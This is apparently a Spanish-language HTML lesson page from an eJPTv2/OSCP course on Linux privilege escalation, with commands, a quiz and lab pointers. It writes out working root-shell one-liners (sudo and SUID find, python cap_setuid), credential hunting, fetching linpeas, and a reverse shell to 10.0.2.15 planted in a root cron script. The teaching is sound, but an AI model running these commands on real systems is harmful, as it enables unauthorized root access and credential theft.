@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="es" data-root="../">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>11 · Post-explotación y privesc Linux · Academia eJPTv2</title>
+<meta name="description" content="Enumeración local, linpeas, SUID, sudo, cron, capabilities, grupos y exploits de kernel.">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+<div class="layout">
+<aside class="sidebar"></aside>
+<main>
+<span class="badge ejpt">Nivel 1 · eJPTv2</span><span class="badge oscp">Crítico en OSCP</span>
+<h1>11 · Post-explotación y escalada en Linux</h1>
+<p class="lead">Has entrado como un usuario con pocos permisos (ej. www-data). Objetivo: convertirte en <b>root</b>. Se trata de enumerar el sistema y encontrar la mala configuración.</p>
+
+<h2>1. Lo primero al entrar</h2>
+<pre><span class="p">$</span> whoami; id            <span class="c"># ¿quién soy, qué grupos?</span>
+<span class="p">$</span> hostname; uname -a    <span class="c"># versión del kernel</span>
+<span class="p">$</span> cat /etc/os-release   <span class="c"># distribución</span>
+<span class="p">$</span> ip a; ip route        <span class="c"># ¿hay más redes? (pivoting)</span>
+<span class="p">$</span> sudo -l               <span class="c"># ⭐ qué puedo ejecutar como root</span></pre>
+
+<h2>2. Enumeración automática</h2>
+<pre><span class="c"># Sube linpeas desde Kali (python3 -m http.server) y ejecútalo</span>
+<span class="p">$</span> wget http://10.0.2.15/linpeas.sh -O /tmp/lp.sh
+<span class="p">$</span> chmod +x /tmp/lp.sh; /tmp/lp.sh | tee /tmp/out.txt
+<span class="c"># Alternativas: LinEnum.sh, pspy (ver procesos/cron en tiempo real)</span></pre>
+<div class="box tip"><strong>💡 linpeas colorea</strong>Lo que sale en <b>rojo/amarillo</b> es lo más prometedor. Pero no te fíes solo de él: revisa a mano sudo, SUID y cron.</div>
+
+<h2>3. Los 6 vectores de escalada más comunes</h2>
+<figure>
+<svg viewBox="0 0 820 220" role="img" aria-label="Vectores de privesc">
+<g text-anchor="middle" font-size="13">
+<rect x="20" y="20" width="240" height="80" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="140" y="50" font-weight="800">sudo -l</text><text x="140" y="75" font-size="12" class="muted">permisos sudo mal dados</text>
+<rect x="290" y="20" width="240" height="80" rx="10" fill="#d9770622" stroke="#d97706"/><text x="410" y="50" font-weight="800">SUID / SGID</text><text x="410" y="75" font-size="12" class="muted">binarios con bit especial</text>
+<rect x="560" y="20" width="240" height="80" rx="10" fill="#0f9d6e22" stroke="#0f9d6e"/><text x="680" y="50" font-weight="800">Cron jobs</text><text x="680" y="75" font-size="12" class="muted">tareas de root editables</text>
+<rect x="20" y="120" width="240" height="80" rx="10" fill="#2563eb22" stroke="#2563eb"/><text x="140" y="150" font-weight="800">Capabilities</text><text x="140" y="175" font-size="12" class="muted">cap_setuid en python/perl</text>
+<rect x="290" y="120" width="240" height="80" rx="10" fill="#a855f722" stroke="#a855f7"/><text x="410" y="150" font-weight="800">Grupos</text><text x="410" y="175" font-size="12" class="muted">docker, lxd, disk</text>
+<rect x="560" y="120" width="240" height="80" rx="10" fill="#dc262622" stroke="#dc2626"/><text x="680" y="150" font-weight="800">Kernel / software</text><text x="680" y="175" font-size="12" class="muted">exploit por versión</text>
+</g></svg></figure>
+
+<h3>a) sudo mal configurado — lo primero y lo más común</h3>
+<pre><span class="p">$</span> sudo -l
+<span class="c"># Si ves: (ALL) NOPASSWD: /usr/bin/find  → a GTFOBins</span>
+<span class="p">$</span> sudo find . -exec /bin/sh \; -quit     <span class="c"># ¡eres root!</span>
+<span class="c"># sudo sin contraseña a vim, python, less, awk, nmap... todos escalables</span></pre>
+<div class="box tip"><strong>💡 GTFOBins</strong>gtfobins.github.io: busca cualquier binario y te dice cómo abusar de él con sudo/SUID. Es tu mejor amigo en privesc Linux.</div>
+
+<h3>b) Binarios SUID</h3>
+<pre><span class="p">$</span> find / -perm -4000 -type f 2>/dev/null
+<span class="c"># Si aparece un binario raro o uno de GTFOBins (cp, find, nano, bash...)</span>
+<span class="p">$</span> /usr/bin/find . -exec /bin/sh -p \; -quit</pre>
+
+<h3>c) Tareas cron</h3>
+<pre><span class="p">$</span> cat /etc/crontab; ls -la /etc/cron.*
+<span class="c"># Si root ejecuta un script que TÚ puedes editar:</span>
+<span class="p">$</span> echo 'bash -i >& /dev/tcp/10.0.2.15/443 0>&1' >> /ruta/script_de_root.sh
+<span class="c"># Espera a que el cron lo ejecute → reverse shell como root</span>
+<span class="p">$</span> ./pspy64      <span class="c"># para ver qué cron se ejecuta y cuándo</span></pre>
+
+<h3>d) Capabilities</h3>
+<pre><span class="p">$</span> getcap -r / 2>/dev/null
+<span class="c"># Si python tiene cap_setuid:</span>
+<span class="p">$</span> python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'</pre>
+
+<h3>e) Grupos peligrosos</h3>
+<p>Si <code>id</code> te pone en <b>docker</b> o <b>lxd</b>, puedes montar un contenedor que monte el disco del host y leer/escribir como root. <b>disk</b> → leer todo el disco con debugfs. <b>adm</b> → leer logs con credenciales.</p>
+
+<h3>f) Exploits de kernel / software (último recurso)</h3>
+<pre><span class="p">$</span> uname -r                              <span class="c"># ej. 4.4.0-21</span>
+<span class="p">$</span> searchsploit linux kernel 4.4 privilege
+<span class="c"># Famosos: DirtyCow (CVE-2016-5195), DirtyPipe, pwnkit (CVE-2021-4034)</span>
+<span class="p">$</span> searchsploit pkexec pwnkit</pre>
+<div class="box warn"><strong>⚠️ Los exploits de kernel son el último recurso</strong>Pueden tumbar la máquina. Primero agota sudo, SUID, cron y credenciales. En el OSCP, tirar una máquina te hace perder tiempo (y reiniciarla).</div>
+
+<h2>4. Buscar credenciales por todas partes</h2>
+<pre><span class="p">$</span> cat ~/.bash_history
+<span class="p">$</span> grep -ri "password" /var/www 2>/dev/null
+<span class="p">$</span> cat /var/www/html/config.php wp-config.php
+<span class="p">$</span> find / -name "id_rsa" 2>/dev/null       <span class="c"># claves SSH privadas</span>
+<span class="p">$</span> cat /etc/passwd                          <span class="c"># reutiliza contraseñas entre usuarios</span></pre>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP: metodología de privesc</strong>1) Enumera a mano + linpeas. 2) sudo -l. 3) SUID/SGID + GTFOBins. 4) cron + pspy. 5) capabilities. 6) grupos. 7) credenciales reutilizadas. 8) kernel/software como último recurso. Documenta el comando exacto que te dio root: va al reporte.</div>
+
+<h2>🎥 Vídeos</h2>
+<div class="vlinks">
+<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins (web imprescindible)</a>
+<a href="https://www.youtube.com/results?search_query=escalada+privilegios+linux+espa%C3%B1ol" target="_blank" rel="noopener">Privesc Linux (ES)</a>
+<a href="https://www.youtube.com/results?search_query=linpeas+privilege+escalation" target="_blank" rel="noopener">linpeas</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 11 · Privesc Linux">
+[
+{"q":"¿Cuál es el PRIMER comando de escalada que ejecutas?","o":["uname -a","sudo -l","find / -perm -4000","cat /etc/shadow"],"a":1,"e":"sudo -l te dice qué puedes ejecutar como root sin esfuerzo."},
+{"q":"¿Qué web te dice cómo abusar de un binario con SUID o sudo?","o":["crackstation","GTFOBins","exploit-db","revshells"],"a":1,"e":"GTFOBins."},
+{"q":"¿Qué comando lista binarios con bit SUID?","o":["find / -perm -4000 -type f 2>/dev/null","getcap -r /","sudo -l","ls -suid"],"a":0,"e":"-perm -4000 = SUID."},
+{"q":"Un script que ejecuta root por cron y es editable por ti permite…","o":["Nada","Meterle una reverse shell y ser root","Solo leerlo","Borrar root"],"a":1,"e":"Añades tu payload y esperas a que root lo ejecute."},
+{"q":"Si perteneces al grupo 'docker', puedes…","o":["Nada especial","Montar un contenedor con el disco del host y ser root","Solo ver contenedores","Reiniciar"],"a":1,"e":"El grupo docker equivale a root."},
+{"q":"¿Por qué el exploit de kernel es el ÚLTIMO recurso?","o":["Es ilegal","Puede tumbar la máquina","Es lento de escribir","No funciona nunca"],"a":1,"e":"Riesgo de crashear el sistema; agota antes las malas configuraciones."},
+{"q":"getcap -r / sirve para…","o":["Ver SUID","Listar capabilities","Ver cron","Ver sudo"],"a":1,"e":"Las capabilities (cap_setuid) también permiten escalar."},
+{"q":"¿Dónde buscas credenciales reutilizadas tras entrar?","o":["Solo en /etc/shadow","bash_history, config.php, id_rsa, logs","En Nmap","En el router"],"a":1,"e":"Las credenciales aparecen en historiales, configs y claves."}
+]
+</script>
+<div class="lab"><h4>🧪 Práctica</h4><p>Resuelve en TryHackMe las salas <b>"Linux PrivEsc"</b> y <b>"Common Linux Privesc"</b>. Para cada técnica, apunta el comando exacto que te da root. Repite hasta que puedas hacerlas sin mirar.</p></div>
+
+</main>
+<nav class="toc"></nav>
+</div>
+<script src="../assets/app.js"></script>
+</body>
+</html>
